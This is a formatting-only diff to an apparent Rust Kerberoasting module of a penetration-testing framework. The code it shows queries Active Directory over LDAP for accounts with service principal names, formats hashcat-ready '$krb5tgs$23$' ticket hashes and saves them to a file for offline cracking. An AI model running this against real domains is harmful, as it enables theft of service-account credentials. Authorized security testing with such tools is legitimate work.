@@ -54,9 +54,7 @@ impl NxcModule for Kerberoasting {
         let user_filter = opts.get("USER").map(|s| s.as_str()).unwrap_or("*");
 
         let ldap_session = match session.protocol() {
-            "ldap" => session
-                .downcast_mut::<nxc_protocols::ldap::LdapSession>()
-                .unwrap(),
+            "ldap" => session.downcast_mut::<nxc_protocols::ldap::LdapSession>().unwrap(),
             _ => return Err(anyhow::anyhow!("Module only supports LDAP")),
         };
 
@@ -85,42 +83,23 @@ impl NxcModule for Kerberoasting {
         let protocol = nxc_protocols::ldap::LdapProtocol::new();
         let base_dn = protocol.get_base_dn(ldap_session).await?;
 
-        tracing::debug!(
-            "kerberoasting: Searching for Kerberoastable users in {}",
-            base_dn
-        );
+        tracing::debug!("kerberoasting: Searching for Kerberoastable users in {}", base_dn);
 
         // Filter for users with SPNs that are not disabled
         let filter = format!(
-            "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*)(sAMAccountName={})(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
-            user_filter
+            "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*)(sAMAccountName={user_filter})(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
         );
 
-        let attrs = vec![
-            "sAMAccountName",
-            "servicePrincipalName",
-            "memberOf",
-            "pwdLastSet",
-            "lastLogon",
-        ];
+        let attrs =
+            vec!["sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet", "lastLogon"];
 
-        let entries = protocol
-            .search(
-                ldap_session,
-                &base_dn,
-                ldap3::Scope::Subtree,
-                &filter,
-                attrs,
-            )
-            .await?;
+        let entries =
+            protocol.search(ldap_session, &base_dn, ldap3::Scope::Subtree, &filter, attrs).await?;
 
         let mut output_lines = Vec::new();
         let mut results = Vec::new();
 
-        output_lines.push(format!(
-            "{:<20} {:<30} {:<15}",
-            "Username", "SPN", "Password Last Set"
-        ));
+        output_lines.push(format!("{:<20} {:<30} {:<15}", "Username", "SPN", "Password Last Set"));
         output_lines.push("-".repeat(65));
 
         for entry in &entries {
@@ -130,17 +109,9 @@ impl NxcModule for Kerberoasting {
                 .and_then(|v| v.first())
                 .cloned()
                 .unwrap_or_default();
-            let spns = entry
-                .attrs
-                .get("servicePrincipalName")
-                .cloned()
-                .unwrap_or_default();
-            let pwd_last_set = entry
-                .attrs
-                .get("pwdLastSet")
-                .and_then(|v| v.first())
-                .cloned()
-                .unwrap_or_default();
+            let spns = entry.attrs.get("servicePrincipalName").cloned().unwrap_or_default();
+            let pwd_last_set =
+                entry.attrs.get("pwdLastSet").and_then(|v| v.first()).cloned().unwrap_or_default();
 
             for spn in &spns {
                 let mut hash_output = "No TGT available for extraction".to_string();
@@ -153,8 +124,7 @@ impl NxcModule for Kerberoasting {
                         let cipher = hex::encode(&tgs.ticket_data[16.min(tgs.ticket_data.len())..]);
 
                         hash_output = format!(
-                            "$krb5tgs$23$*{}*{}${}*{}*{}",
-                            sam, domain, spn, checksum, cipher
+                            "$krb5tgs$23$*{sam}*{domain}${spn}*{checksum}*{cipher}"
                         );
 
                         // Log exactly what hashcat needs
@@ -169,11 +139,7 @@ impl NxcModule for Kerberoasting {
                     sam,
                     spn,
                     pwd_last_set,
-                    if hash_output.starts_with("$krb") {
-                        "HASH EXTRACTED!"
-                    } else {
-                        ""
-                    }
+                    if hash_output.starts_with("$krb") { "HASH EXTRACTED!" } else { "" }
                 ));
                 results.push(serde_json::json!({
                     "username": sam,
@@ -192,24 +158,19 @@ impl NxcModule for Kerberoasting {
         let hashes_only: Vec<String> = results
             .iter()
             .filter_map(|r| {
-                r["hash"]
-                    .as_str()
-                    .filter(|h| h.starts_with("$krb"))
-                    .map(|h| h.to_string())
+                r["hash"].as_str().filter(|h| h.starts_with("$krb")).map(|h| h.to_string())
             })
             .collect();
 
         if !hashes_only.is_empty() {
             let file_path = std::env::current_dir()?.join("kerberoastable.txt");
-            let mut file = std::fs::OpenOptions::new()
-                .create(true)
-                .append(true)
-                .open(&file_path)?;
+            let mut file =
+                std::fs::OpenOptions::new().create(true).append(true).open(&file_path)?;
             use std::io::Write;
             for h in hashes_only {
-                writeln!(file, "{}", h)?;
+                writeln!(file, "{h}")?;
             }
-            output_lines.push(format!("Saved extracted hashes to {:?}", file_path));
+            output_lines.push(format!("Saved extracted hashes to {file_path:?}"));
         }
 
         Ok(ModuleResult {
